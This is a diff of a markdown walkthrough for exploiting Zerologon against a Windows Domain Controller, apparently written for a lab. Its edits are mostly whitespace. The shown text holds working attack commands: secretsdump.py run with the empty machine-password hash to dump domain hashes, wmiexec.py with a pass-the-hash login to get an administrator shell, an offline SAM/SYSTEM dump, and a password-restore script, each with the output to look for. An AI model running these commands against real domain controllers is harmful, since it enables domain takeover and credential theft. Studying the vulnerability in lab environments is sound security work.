@@ -5,6 +5,7 @@
 1. you need the Domain Name for the Windows Domain Controller you are attacking.
 2. you need the NetBIOS Name (PC name) for the Windows Domain Controller you are attacking.
 3. you need the IP address for the Windows Domain Controller you are attacking. 
+
 **That is all!!**
 
 ## Nmap to the rescue:
@@ -48,6 +49,7 @@ Success! DC should now have the empty string as its machine password.
 
 ## 2nd run secretsdump.py to dump the hashes:
 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \<Domain\>/\<NETBIOS-name\>\\$@\<IP-Address\>
+
 it is important to have \$@ in between the NetBIOS name and the IP 
 
 ```
@@ -55,12 +57,12 @@ secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ZEROLOGON/ZEROLOGON-DC\
 ```
 
 looking for:
+
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::
 
 
 ## 3rd run wmiexec.py to get terminal on victim machine:
 
-ZEROLOGON/Administrator@192.168.1.28
 wmiexec.py \<Domain\>/\<user-name\>@\<IP-Address\> -hashes \<administrator-hash\>
 
 ```
@@ -68,6 +70,7 @@ wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435
 ```
 
 Looking for:
+
 C:\>
 
 
@@ -114,10 +117,12 @@ secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
 ```
 
 Looking for:
+
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::
 
 ## Restore the original password:
 python3 reinstall_original_pw.py <NetBIOS-name> <IP-Address> <admin-hash>
+
 ```
 python3 reinstall_original_pw.py ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
 ```
